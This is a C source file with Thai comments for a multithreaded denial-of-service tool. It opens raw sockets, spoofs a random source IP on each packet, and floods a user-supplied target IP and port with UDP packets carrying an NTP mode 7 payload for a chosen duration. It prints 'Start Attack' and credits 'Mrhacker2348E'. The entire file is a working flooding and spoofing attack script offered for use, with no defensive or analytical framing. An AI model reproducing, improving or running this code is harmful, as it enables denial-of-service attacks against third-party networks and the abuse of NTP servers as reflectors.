#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define PACKET_SIZE 64

// โครงสร้างสำหรับข้อมูลเธรด
typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
} AttackParams;

// ฟังก์ชันสุ่ม IP ปลอม (IPv4)
void generate_fake_ipv4(char *ip) {
    sprintf(ip, "%d.%d.%d.%d", rand() % 254 + 1, rand() % 255, rand() % 255, rand() % 255);
}

// ฟังก์ชันคำนวณ Checksum สำหรับ IP Header
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// ฟังก์ชันสร้างและส่งแพ็กเก็ต UDP
void *send_spoofed_packet(void *arg) {
    AttackParams *params = (AttackParams *)arg;
    int sock;
    struct sockaddr_in dest;
    char packet[PACKET_SIZE];
    struct ip *ip_hdr = (struct ip *)packet;
    struct udphdr *udp_hdr = (struct udphdr *)(packet + sizeof(struct ip));
    char *payload = packet + sizeof(struct ip) + sizeof(struct udphdr);

    // สร้าง socket แบบ Raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // เปิดโหมด IP_HDRINCL เพื่อกำหนด IP Header เอง
    int optval = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval));

    // ตั้งค่าโครงสร้างที่อยู่ของเป้าหมาย
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest.sin_addr);

    time_t start_time = time(NULL);
    int packet_count = 0;

    while (time(NULL) - start_time < params->duration) {
        char fake_ip[16];
        generate_fake_ipv4(fake_ip);
        inet_pton(AF_INET, fake_ip, &ip_hdr->ip_src);

        // ตั้งค่า IP Header
        ip_hdr->ip_v = 4;
        ip_hdr->ip_hl = 5;
        ip_hdr->ip_tos = 0;
        ip_hdr->ip_len = htons(PACKET_SIZE);
        ip_hdr->ip_id = htons(rand() % 65535);
        ip_hdr->ip_off = 0;
        ip_hdr->ip_ttl = 64;
        ip_hdr->ip_p = IPPROTO_UDP;
        inet_pton(AF_INET, params->target_ip, &ip_hdr->ip_dst);
        ip_hdr->ip_sum = checksum(ip_hdr, sizeof(struct ip));

        // ตั้งค่า UDP Header
        udp_hdr->uh_sport = htons(rand() % 65535);
        udp_hdr->uh_dport = htons(params->target_port);
        udp_hdr->uh_ulen = htons(PACKET_SIZE - sizeof(struct ip));
        udp_hdr->uh_sum = 0;

        // ใส่ payload ของ NTP monlist (mode 7)
        memset(payload, 0, PACKET_SIZE - sizeof(struct ip) - sizeof(struct udphdr));
        payload[0] = 0x17;  // Mode 7

        // ส่งแพ็กเก็ต
        if (sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Packet send failed");
        } else {
            printf("Thread %ld: SendPacket %d By %s To %s:%d\n",
                   pthread_self(), ++packet_count, fake_ip, params->target_ip, params->target_port);
        }
    }

    close(sock);
    return NULL;
}

// ฟังก์ชันเริ่มต้นเธรดโจมตี
void start_attack(char *target_ip, int target_port, int duration, int num_threads) {
    pthread_t threads[num_threads];
    AttackParams params = {.target_port = target_port, .duration = duration};
    strncpy(params.target_ip, target_ip, 15);

    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, send_spoofed_packet, &params);
    }
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
}

// โปรแกรมหลัก
int main(int argc, char *argv[]) {
    if (argc != 5) {
    printf("Made by : Mrhacker2348E");
        printf("Usage: %s <target_ip> <target_port> <num_threads> <duration>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    int duration = atoi(argv[4]);

    printf("Start Attack %s:%d %d threads Time %d Second\n", target_ip, target_port, num_threads, duration);
    start_attack(target_ip, target_port, duration, num_threads);

    return 0;
}